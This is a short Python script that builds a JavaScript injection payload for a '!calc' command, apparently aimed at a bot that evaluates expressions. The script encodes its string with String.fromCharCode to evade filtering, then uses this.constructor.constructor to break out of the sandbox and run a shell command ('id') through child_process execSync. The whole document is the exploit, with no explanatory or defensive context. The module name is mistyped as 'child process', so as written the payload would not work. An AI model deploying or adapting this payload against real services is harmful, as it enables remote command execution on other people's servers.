def get(s):
    return "+".join(["a(" + str(ord(x)) + ")" for x in s])


command = 'id'

print(
    "!calc"
    + "a = String.fromCharCode;"
    + "this.constructor.constructor("
    + get(f"return process.mainModule.require('child process').execSync('{command}').toString()")
    + ")()"
)
